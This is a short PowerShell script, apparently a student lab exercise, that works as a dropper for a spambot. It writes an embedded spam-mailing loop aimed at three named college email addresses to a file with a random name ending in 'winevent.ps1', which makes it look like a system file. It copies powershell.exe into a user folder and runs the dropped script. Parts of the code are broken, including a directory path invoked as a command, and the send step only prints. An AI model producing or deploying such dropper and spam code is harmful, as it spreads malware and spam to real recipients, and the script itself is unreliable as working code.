<# Storyline: Dropper for our spambot that will save to a directory
and then execute it
#>

$writeSbBot = @'
# Send an email using Powershell

$toSend = @('sebastian.meredith@mymail.champlain.edu','ston@champlain.edu','duns@champlain.edu')
# Message body
$msg = "Here in my garage, just bought this new lamborghini here. It’s fun to drive up here in the Steam Hills. But you know what I like more than single discounts? Steam Sales In fact, I’m a lot more proud of two new Steam Sales that I had to get installed to hold twelve thousand new discounts on Steam. It’s like what i say, “the more you discount, the more you earn.”"
while ($true) {

   foreach ($email in $toSend) {
    # Send the email 
    write-host "Send-MailMessage - from 'sebastian.meredith@mymail.champlain.edu' -To $email - Subject "Tisk Tisk" `
    -Body $msg -SmtpServer X.X.X.X"
    #Pause for one second 
    # start-sleep 1
    }
}
'@
Copy-Item "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination "C:\Users\Sebby"

#Directory to write the bot
$sbDir = & 'D:\Spam Test'

#Create a random number to add to the file.
$sbRand = Get-random -Minimum 1000 -Maximum 1999

#Create the file and location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

#Write this to a file 
$writeSbBot | out-file -FilePath $file

#Excutes the PowerShell script 
Invoke-Expression $file
